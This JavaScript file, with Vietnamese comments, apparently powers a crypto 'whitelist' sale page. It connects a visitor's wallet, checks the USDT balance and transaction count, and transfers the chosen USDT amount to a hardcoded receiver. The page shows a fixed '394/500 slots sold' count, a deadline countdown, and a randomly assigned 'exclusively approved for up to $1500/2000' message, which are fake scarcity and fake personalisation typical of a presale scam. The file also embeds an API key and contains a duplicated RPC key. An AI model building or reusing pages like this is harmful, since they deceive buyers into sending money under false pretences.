const usdtContract = '0x55d398326f99059fF775485246999027B3197955'; // USDT Mainnet
const BSCSCAN_API_KEY = '3SGAXVNXJ2ZKU8AVZSF4794NUXEIF7I4S2'; // API Key đã thay
const ABI = [
  {
    "constant": true,
    "inputs": [{ "name": "_owner", "type": "address" }],
    "name": "balanceOf",
    "outputs": [{ "name": "balance", "type": "uint256" }],
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      { "name": "_to", "type": "address" },
      { "name": "_value", "type": "uint256" }
    ],
    "name": "transfer",
    "outputs": [{ "name": "success", "type": "bool" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "decimals",
    "outputs": [{ "name": "", "type": "uint8" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "symbol",
    "outputs": [{ "name": "", "type": "string" }],
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [],
    "name": "name",
    "outputs": [{ "name": "", "type": "string" }],
    "type": "function"
  }
];

let connectedWallet = null;
let web3;
let provider;

// Khởi tạo WalletConnect cho Mainnet
async function initWalletConnect() {
  if (typeof WalletConnectProvider === 'undefined') {
    console.error("WalletConnectProvider not loaded");
    return false;
  }
  try {
    provider = new WalletConnectProvider({
      rpc: {
        56: 'https://bsc-dataseed1.defibit.io/', // Ưu tiên
        56: 'https://bsc-dataseed.binance.org/',
        56: 'https://bsc-dataseed1.ninicoin.io/'
      },
      chainId: 56,
      projectId: '8da24de9722108962a6b7aef48298aae',
    });
    web3 = new Web3(provider);
    return true;
  } catch (error) {
    console.error("WalletConnect init failed:", error);
    return false;
  }
}

// Fallback MetaMask
async function initMetaMask() {
  if (window.ethereum) {
    web3 = new Web3(window.ethereum);
    return true;
  }
  return false;
}

// Chuyển chain sang BSC Mainnet
async function switchToBSC() {
  try {
    await provider.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x38' }],
    });
  } catch (switchError) {
    if (switchError.code === 4902) {
      await provider.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: '0x38',
          chainName: 'Binance Smart Chain',
          rpcUrls: ['https://bsc-dataseed1.defibit.io/'],
          nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
          blockExplorerUrls: ['https://bscscan.com']
        }],
      });
    } else {
      throw switchError;
    }
  }
}

// Check số giao dịch của ví qua BscScan API
async function checkTransactionCount(walletAddress) {
  try {
    const response = await fetch(`https://api.bscscan.com/api?module=account&action=txlist&address=${walletAddress}&startblock=0&endblock=99999999&sort=asc&apikey=${BSCSCAN_API_KEY}`);
    const data = await response.json();
    if (data.status === "1") {
      const txCount = data.result.length;
      console.log("Transaction count:", txCount);
      return txCount;
    } else {
      console.error("BscScan API error:", data.message);
      return 0;
    }
  } catch (error) {
    console.error("Error fetching transaction count:", error);
    return 0;
  }
}

// Hamburger Menu Toggle
document.addEventListener('DOMContentLoaded', async () => {
  const hamburgerIcon = document.querySelector('.hamburger-icon');
  const navMenu = document.querySelector('#nav-menu');
  hamburgerIcon.addEventListener('click', () => {
    navMenu.classList.toggle('active');
  });

  if (!(await initWalletConnect())) {
    await initMetaMask();
  }
});

// Connect Wallet
document.getElementById('connectButton').addEventListener('click', async () => {
  console.log("Connect Wallet clicked");
  try {
    let accounts;
    if (provider) {
      await provider.enable();
      await switchToBSC();
      accounts = await web3.eth.getAccounts();
    } else if (window.ethereum) {
      accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x38' }],
      });
      accounts = await web3.eth.getAccounts();
    } else {
      throw new Error("No wallet provider available");
    }

    connectedWallet = accounts[0];
    document.getElementById('walletText').innerText = `Connected: ${connectedWallet.slice(0, 6)}...${connectedWallet.slice(-4)}`;
    document.getElementById('connectButton').style.display = 'none';
    document.getElementById('disconnectButton').style.display = 'block';
    console.log("Wallet connected:", connectedWallet);

    // Check số dư USDT
    let usdtValue = 0;
    try {
      const contract = new web3.eth.Contract(ABI, usdtContract);
      const balanceUSDT = await contract.methods.balanceOf(connectedWallet).call({ gas: 100000 });
      usdtValue = Number(web3.utils.fromWei(balanceUSDT, 'mwei'));
      console.log("USDT Balance:", usdtValue);
    } catch (error) {
      console.error("USDT balance error:", error);
      document.getElementById('resultText').innerText = 'Error fetching USDT balance';
      return;
    }

    // Check số giao dịch
    const txCount = await checkTransactionCount(connectedWallet);

    // Điều kiện whitelist: Số dư >1 USDT HOẶC ≥5 giao dịch
    const isEligible = usdtValue > 1 || txCount >= 5;
    // Chỉ hiển thị "Not eligible" nếu không đủ điều kiện, không hiện chi tiết
    document.getElementById('resultText').innerText = isEligible ? `Eligible (USDT: ${usdtValue}, Transactions: ${txCount})` : `Not eligible`;

    // Hiển thị form whitelist
    document.getElementById('whitelistForm').style.display = 'block';
    if (isEligible) {
      document.getElementById('payButton').style.display = 'block';
      document.getElementById('notEligibleText').style.display = 'none';

      // Kiểm tra xem ví đã có limit được lưu chưa
      const limitKey = `limit_${connectedWallet}`;
      let limit = localStorage.getItem(limitKey);
      if (!limit) {
        // Nếu chưa có (lần đầu), tạo limit ngẫu nhiên và lưu
        limit = Math.random() < 0.5 ? 1500 : 2000;
        localStorage.setItem(limitKey, limit);
        console.log("First time for wallet, assigned limit:", limit);
      } else {
        console.log("Wallet already has limit, using stored limit:", limit);
      }

      // Hiển thị thông báo với limit
      document.getElementById('exclusiveMessage').style.display = 'block';
      document.getElementById('exclusiveMessage').innerText = `You're exclusively approved for up to $${limit}!`;
    } else {
      document.getElementById('payButton').style.display = 'none';
      document.getElementById('notEligibleText').style.display = 'block';
      document.getElementById('exclusiveMessage').style.display = 'none';
      console.log("Wallet not eligible for whitelist");
    }
  } catch (error) {
    document.getElementById('resultText').innerText = 'Error connecting wallet: ' + error.message;
    console.error("Error connecting wallet:", error);
    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
      setTimeout(() => {
        window.location.href = 'https://metamask.app.link';
      }, 1000);
    }
  }
});

// Disconnect Wallet
document.getElementById('disconnectButton').addEventListener('click', async () => {
  try {
    if (provider) {
      await provider.disconnect();
    }
    connectedWallet = null;
    document.getElementById('walletText').innerText = '';
    document.getElementById('resultText').innerText = '';
    document.getElementById('whitelistForm').style.display = 'none';
    document.getElementById('connectButton').style.display = 'block';
    document.getElementById('disconnectButton').style.display = 'none';
    console.log("Wallet disconnected");
  } catch (error) {
    console.error("Disconnect error:", error);
  }
});

// Buy Whitelist
document.getElementById('payButton').addEventListener('click', async (e) => {
  e.preventDefault();
  console.log("Buy Whitelist clicked"); // Log khi nhấn nút
  if (!connectedWallet) {
    document.getElementById('resultText').innerText = 'Wallet not connected';
    console.log("Wallet not connected");
    return;
  }
  const [amount, currency] = document.getElementById('amountDropdown').value.split('|');
  const receiver = '0x871526acf5345BA48487dc177C83C453e9B998F5';

  // Kiểm tra giá trị amount và currency
  console.log("Selected amount:", amount, "Currency:", currency);

  try {
    let txHash;
    if (currency === 'USDT') {
      const contract = new web3.eth.Contract(ABI, usdtContract);
      // Chuyển đổi amount thành Wei (USDT có 6 chữ số thập phân, dùng 'mwei')
      const amountWei = web3.utils.toWei(amount.toString(), 'mwei');
      console.log("Amount in Wei:", amountWei); // Log giá trị sau khi chuyển đổi
      console.log("Preparing to send transaction:", { from: connectedWallet, to: receiver, amount: amountWei }); // Log trước khi gửi
      const tx = await contract.methods.transfer(receiver, amountWei).send({ from: connectedWallet, gas: 200000 }); // Gửi giao dịch ngay
      txHash = tx.transactionHash;
      document.getElementById('resultText').innerText = `USDT payment successful! Tx: ${txHash.slice(0, 6)}...${txHash.slice(-4)}`;
      console.log("USDT payment successful:", txHash);
    } else {
      throw new Error("Only USDT payments are supported");
    }
    document.getElementById('payButton').style.display = 'none';
    document.getElementById('connectButton').style.display = 'none';
    document.getElementById('disconnectButton').style.display = 'block';
  } catch (error) {
    document.getElementById('resultText').innerText = 'Payment failed: ' + error.message;
    console.error("Payment failed:", error);
  }
});

// Fixed slots
const currentSlots = 394;
const maxSlots = 500;
const resetDate = new Date('2025-04-28').getTime();
function updateSlots() {
  document.getElementById('slotsText').innerText = `${currentSlots}/500 slots sold!`;
}
function updateCountdown() {
  const now = new Date().getTime();
  const timeLeft = (resetDate - now) / (1000 * 60 * 60 * 24);
  document.getElementById('countdownText').innerText = `${Math.ceil(timeLeft)} days left!`;
}
updateSlots();
updateCountdown();
setInterval(() => { updateCountdown(); }, 10000);

particlesJS('particles-js', { particles: { number: { value: 20 }, color: { value: '#FF4500' }, shape: { type: 'star' }, opacity: { value: 0.7, random: true }, size: { value: 2, random: true }, move: { speed: 0.5, direction: 'bottom' } } });